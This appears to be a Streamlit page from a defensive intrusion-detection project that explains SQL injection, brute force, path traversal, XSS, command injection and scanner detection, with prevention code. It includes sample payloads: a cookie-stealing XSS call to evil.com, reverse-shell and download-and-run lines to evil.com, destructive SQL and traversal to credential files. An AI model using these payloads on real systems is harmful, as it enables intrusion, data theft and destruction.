"""
Attack Guide — educational reference for all attack types
"""
import streamlit as st

st.set_page_config(page_title="Attack Guide", page_icon="📖", layout="wide")

st.title("📖 Cyber Attack Reference Guide")
st.markdown("Complete guide to the attack types this system detects and defends against.")
st.divider()

tabs = st.tabs([
    "💉 SQL Injection",
    "🔨 Brute Force",
    "📁 Path Traversal",
    "🕷️ XSS",
    "⚡ Command Injection",
    "🤖 Bot Scanners",
    "🔗 Attack Kill Chain",
])

# ── SQL Injection ─────────────────────────────────────────────────────────────
with tabs[0]:
    col1, col2 = st.columns([1, 1])
    with col1:
        st.markdown("""
        ## 💉 SQL Injection

        **OWASP Rank:** A03:2021 — Injection  
        **CWE:** CWE-89  
        **Severity:** 🔴 CRITICAL

        ### What is it?
        SQL Injection occurs when user-supplied input is incorporated into a database
        query without proper sanitization. The attacker can manipulate the query logic
        to bypass authentication, extract data, modify records, or destroy the database.

        ### How it works
        ```sql
        -- Vulnerable query:
        SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

        -- Attacker input: ' OR '1'='1'--
        -- Resulting query:
        SELECT * FROM users WHERE username='' OR '1'='1'--' AND password=''
        -- The '--' comments out the rest, '1'='1' is always true
        -- Result: logs in as first user (usually admin)
        ```

        ### Attack Variants
        | Type | Example | Goal |
        |------|---------|------|
        | Classic | `' OR '1'='1--` | Auth bypass |
        | UNION | `' UNION SELECT user,pass FROM users--` | Data extraction |
        | Blind | `' AND SLEEP(5)--` | Detect vulnerability |
        | Error-based | `' AND EXTRACTVALUE(1,...)` | Extract via errors |
        | Stacked | `'; DROP TABLE users--` | Destructive |
        """)

    with col2:
        st.markdown("""
        ### Detection (This System)
        Checks 25+ regex patterns against URL-decoded request paths:
        ```python
        patterns = [
            r"union[\\s\\+]+select",      # UNION SELECT
            r"drop[\\s\\+]+(table|database)",  # DROP TABLE
            r"'[\\s]*or[\\s]+'1'='1",    # Classic bypass
            r"sleep\\s*\\(\\s*\\d+",     # Blind timing
            r"xp_cmdshell",              # MSSQL RCE
            r"into\\s+outfile",          # File write
        ]
        ```

        ### Prevention
        ```python
        # ❌ Vulnerable
        query = f"SELECT * FROM users WHERE id={user_id}"

        # ✅ Secure — parameterized query
        cursor.execute(
            "SELECT * FROM users WHERE id=?",
            (user_id,)
        )

        # ✅ Also secure — ORM
        User.objects.filter(id=user_id)
        ```

        ### References
        - [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
        - [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
        - [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
        """)

# ── Brute Force ───────────────────────────────────────────────────────────────
with tabs[1]:
    col1, col2 = st.columns([1, 1])
    with col1:
        st.markdown("""
        ## 🔨 Brute Force Attack

        **OWASP Rank:** A07:2021 — Identification and Authentication Failures  
        **CWE:** CWE-307  
        **Severity:** 🟠 HIGH

        ### What is it?
        An attacker systematically tries many passwords against a login endpoint
        until finding the correct one. Modern tools can try thousands per second.

        ### How it works
        ```
        Attacker → POST /login {user: admin, pass: password1}  → 401
        Attacker → POST /login {user: admin, pass: password2}  → 401
        Attacker → POST /login {user: admin, pass: password3}  → 401
        ...
        Attacker → POST /login {user: admin, pass: secret123}  → 200 ✅
        ```

        ### Detection (This System)
        Sliding window counter per IP:
        ```python
        threshold = 5   # attempts
        window    = 60  # seconds

        # If IP makes 5+ failed logins in 60s → BLOCK
        ```

        ### Common Tools
        - **Hydra** — network login cracker
        - **Medusa** — parallel brute forcer
        - **Burp Suite Intruder** — web app brute force
        - **python-requests** — custom scripts
        """)

    with col2:
        st.markdown("""
        ### Prevention
        ```python
        # 1. Account lockout
        if failed_attempts >= 5:
            lock_account(user, duration=300)

        # 2. Rate limiting (Flask-Limiter)
        @limiter.limit("5 per minute")
        def login():
            ...

        # 3. CAPTCHA after N failures
        if session.get('failures', 0) >= 3:
            require_captcha()

        # 4. MFA — even if password guessed, need 2nd factor
        ```

        ### NGINX Rate Limiting
        ```nginx
        limit_req_zone $binary_remote_addr
            zone=login:10m rate=5r/m;

        location /login {
            limit_req zone=login burst=3 nodelay;
        }
        ```

        ### References
        - [OWASP Auth Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
        - [CWE-307](https://cwe.mitre.org/data/definitions/307.html)
        """)

# ── Path Traversal ────────────────────────────────────────────────────────────
with tabs[2]:
    col1, col2 = st.columns([1, 1])
    with col1:
        st.markdown("""
        ## 📁 Path Traversal

        **OWASP Rank:** A01:2021 — Broken Access Control  
        **CWE:** CWE-22  
        **Severity:** 🔴 CRITICAL

        ### What is it?
        Attacker uses `../` sequences to navigate outside the intended directory
        and read sensitive files from the filesystem.

        ### How it works
        ```
        Web root: /var/www/html/
        App serves: /var/www/html/files/report.pdf

        Attacker requests:
        /files?name=../../../../etc/passwd

        Resolved path:
        /var/www/html/files/../../../../etc/passwd
                           ↑ goes up 4 levels
        = /etc/passwd  ← reads system password file!
        ```

        ### Sensitive Targets
        ```
        /etc/passwd          ← User accounts
        /etc/shadow          ← Password hashes
        /.ssh/id_rsa         ← SSH private key
        /var/www/html/.env   ← App secrets
        /proc/self/environ   ← Environment variables
        C:/Windows/win.ini   ← Windows config
        ```
        """)

    with col2:
        st.markdown("""
        ### Encoding Bypasses
        ```
        ../           ← Basic
        %2e%2e%2f     ← URL encoded
        %252e%252e%2f ← Double encoded
        ..%2f         ← Mixed
        ....//        ← Filter bypass
        ..;/          ← Semicolon bypass
        ```

        ### Prevention
        ```python
        import os

        # ❌ Vulnerable
        def get_file(filename):
            return open(filename).read()

        # ✅ Secure
        SAFE_ROOT = "/var/www/html/files"

        def get_file(filename):
            # Resolve to absolute path
            safe_path = os.path.realpath(
                os.path.join(SAFE_ROOT, filename)
            )
            # Verify it's within allowed directory
            if not safe_path.startswith(SAFE_ROOT):
                raise PermissionError("Access denied")
            return open(safe_path).read()
        ```

        ### References
        - [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
        - [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
        """)

# ── XSS ───────────────────────────────────────────────────────────────────────
with tabs[3]:
    col1, col2 = st.columns([1, 1])
    with col1:
        st.markdown("""
        ## 🕷️ Cross-Site Scripting (XSS)

        **OWASP Rank:** A03:2021 — Injection  
        **CWE:** CWE-79  
        **Severity:** 🟠 HIGH

        ### What is it?
        Attacker injects malicious JavaScript into web pages. When other users
        view the page, the script executes in their browser — stealing cookies,
        sessions, or redirecting to phishing sites.

        ### Types
        **Reflected XSS** — payload in URL, reflected in response:
        ```
        https://site.com/search?q=<script>alert(document.cookie)</script>
        ```

        **Stored XSS** — payload saved to database, shown to all users:
        ```
        Comment: <script>fetch('http://evil.com?c='+document.cookie)</script>
        ```

        **DOM-based XSS** — payload processed by client-side JavaScript:
        ```javascript
        document.write(location.hash.substring(1))
        // URL: https://site.com/#<img onerror=alert(1) src=x>
        ```
        """)

    with col2:
        st.markdown("""
        ### Prevention
        ```python
        # ❌ Vulnerable (Flask)
        @app.route('/search')
        def search():
            q = request.args.get('q')
            return f'<p>Results for: {q}</p>'  # XSS!

        # ✅ Secure — escape output
        from markupsafe import escape

        @app.route('/search')
        def search():
            q = request.args.get('q')
            return f'<p>Results for: {escape(q)}</p>'
        ```

        ### Content Security Policy
        ```http
        Content-Security-Policy:
          default-src 'self';
          script-src 'self' 'nonce-{random}';
          object-src 'none';
        ```

        This prevents inline scripts from executing even if injected.

        ### References
        - [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
        - [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
        """)

# ── Command Injection ─────────────────────────────────────────────────────────
with tabs[4]:
    col1, col2 = st.columns([1, 1])
    with col1:
        st.markdown("""
        ## ⚡ Command Injection

        **OWASP Rank:** A03:2021 — Injection  
        **CWE:** CWE-78  
        **Severity:** 🔴 CRITICAL (most dangerous)

        ### What is it?
        Attacker injects OS commands into application inputs that get passed
        to a system shell. This can give complete control of the server.

        ### How it works
        ```python
        # Vulnerable code
        host = request.args.get('host')
        os.system(f"ping -c 1 {host}")

        # Attacker input: localhost; cat /etc/passwd
        # Executed: ping -c 1 localhost; cat /etc/passwd
        #                              ↑ second command runs!
        ```

        ### Shell Metacharacters
        ```
        ;   ← command separator
        |   ← pipe output to command
        &&  ← run if previous succeeded
        ||  ← run if previous failed
        `   ← command substitution
        $() ← command substitution
        ```

        ### Real Attack Scenarios
        ```bash
        # Reverse shell
        x; bash -i >& /dev/tcp/evil.com/4444 0>&1

        # Download and execute malware
        x; wget http://evil.com/malware.sh | bash

        # Crypto miner
        x; curl http://evil.com/miner.sh | bash
        ```
        """)

    with col2:
        st.markdown("""
        ### Prevention
        ```python
        import subprocess
        import shlex

        # ❌ Vulnerable
        os.system(f"ping -c 1 {user_input}")

        # ❌ Still vulnerable
        subprocess.run(f"ping -c 1 {user_input}", shell=True)

        # ✅ Secure — list args, no shell
        subprocess.run(
            ["ping", "-c", "1", validated_host],
            capture_output=True,
            timeout=5
        )

        # ✅ Also secure — whitelist validation
        ALLOWED_HOSTS = ["localhost", "127.0.0.1"]
        if user_input not in ALLOWED_HOSTS:
            raise ValueError("Invalid host")
        ```

        ### Never Do This
        ```python
        # All of these are dangerous with user input:
        os.system(user_input)
        os.popen(user_input)
        subprocess.run(user_input, shell=True)
        eval(user_input)
        exec(user_input)
        ```

        ### References
        - [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
        - [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
        """)

# ── Bot Scanners ──────────────────────────────────────────────────────────────
with tabs[5]:
    st.markdown("""
    ## 🤖 Bot & Scanner Detection

    **Severity:** 🟡 MEDIUM (reconnaissance phase)

    ### What is it?
    Automated tools that probe web applications for vulnerabilities before a real attack.
    Detected by their distinctive User-Agent strings.

    ### Detected Tools
    """)

    import pandas as pd
    st.table(pd.DataFrame([
        {"Tool": "sqlmap", "Purpose": "Automated SQL injection testing", "Risk": "🔴 High"},
        {"Tool": "Nikto", "Purpose": "Web server vulnerability scanner", "Risk": "🟠 Medium"},
        {"Tool": "masscan", "Purpose": "Fast port scanner", "Risk": "🟠 Medium"},
        {"Tool": "dirbuster", "Purpose": "Directory/file brute forcer", "Risk": "🟠 Medium"},
        {"Tool": "Nessus", "Purpose": "Comprehensive vulnerability scanner", "Risk": "🟠 Medium"},
        {"Tool": "Metasploit", "Purpose": "Exploitation framework", "Risk": "🔴 High"},
        {"Tool": "Burp Suite", "Purpose": "Web app security testing", "Risk": "🟠 Medium"},
        {"Tool": "zgrab", "Purpose": "Banner grabber / fingerprinter", "Risk": "🟡 Low"},
        {"Tool": "python-requests", "Purpose": "Custom attack scripts", "Risk": "🟠 Medium"},
    ]))

    st.markdown("""
    ### Kill Chain Position
    Bot scanning is the **Reconnaissance** phase of the attack kill chain:
    ```
    Reconnaissance (Bot Scan) → Scanning → Exploitation → Persistence → Exfiltration
    ```
    Detecting and blocking scanners early prevents the attacker from finding vulnerabilities.
    """)

# ── Kill Chain ────────────────────────────────────────────────────────────────
with tabs[6]:
    st.markdown("""
    ## 🔗 Cyber Attack Kill Chain

    The **Cyber Kill Chain** describes the stages of a cyber attack.
    This system detects and stops attacks at multiple stages.
    """)

    import pandas as pd
    st.table(pd.DataFrame([
        {"Stage": "1. Reconnaissance", "Description": "Attacker scans for vulnerabilities", "Detected As": "BOT_SCAN", "Response": "Rate limit"},
        {"Stage": "2. Weaponization", "Description": "Attacker prepares exploit", "Detected As": "—", "Response": "—"},
        {"Stage": "3. Delivery", "Description": "Attack payload sent to target", "Detected As": "SQL_INJECTION, XSS, etc.", "Response": "Block IP"},
        {"Stage": "4. Exploitation", "Description": "Vulnerability is triggered", "Detected As": "COMMAND_INJECTION", "Response": "Block IP (24h)"},
        {"Stage": "5. Installation", "Description": "Malware installed", "Detected As": "COMMAND_INJECTION", "Response": "Block IP"},
        {"Stage": "6. C2", "Description": "Attacker controls system", "Detected As": "Anomaly detection", "Response": "Alert"},
        {"Stage": "7. Exfiltration", "Description": "Data stolen", "Detected As": "PATH_TRAVERSAL", "Response": "Block IP (24h)"},
    ]))

    st.markdown("""
    ### MITRE ATT&CK Mapping

    | Attack Type | MITRE Technique |
    |-------------|-----------------|
    | SQL Injection | T1190 — Exploit Public-Facing Application |
    | Brute Force | T1110 — Brute Force |
    | Path Traversal | T1083 — File and Directory Discovery |
    | Command Injection | T1059 — Command and Scripting Interpreter |
    | XSS | T1189 — Drive-by Compromise |
    | Bot Scanner | T1595 — Active Scanning |
    """)
